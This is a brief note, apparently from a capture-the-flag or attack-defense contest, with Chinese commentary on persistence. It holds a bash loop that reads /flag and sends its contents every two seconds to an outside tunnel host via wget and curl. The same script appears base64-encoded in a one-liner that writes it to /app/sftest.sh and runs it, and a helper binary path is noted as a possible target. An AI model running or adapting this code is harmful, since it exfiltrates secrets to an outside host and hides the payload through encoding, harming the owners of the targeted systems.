暂时未研究出crontab写法
```sh
#!/bin/bash  
step=2
while true;do
    f=`cat /flag`
    url="http://rtceth.natappfree.cc?token=serfend&flag=$f"
    wget $url
    curl $url
    sleep $step
done
exit 0
```
```sh
/bin/echo 'IyEvYmluL2Jhc2ggIApzdGVwPTIKd2hpbGUgdHJ1ZTtkbwogICAgZj1gY2F0IC9mbGFnYAogICAgdXJsPSJodHRwOi8vcnRjZXRoLm5hdGFwcGZyZWUuY2M/dG9rZW49c2VyZmVuZCZmbGFnPSRmIgogICAgd2dldCAkdXJsCiAgICBjdXJsICR1cmwKICAgIHNsZWVwICRzdGVwCmRvbmUKZXhpdCAw' | /usr/bin/base64 -d > /app/sftest.sh && /bin/sh /app/sftest.sh 
```

user hostname=b1ea97d96875:/usr/lib/xfce4/xfsm-shutdown-helper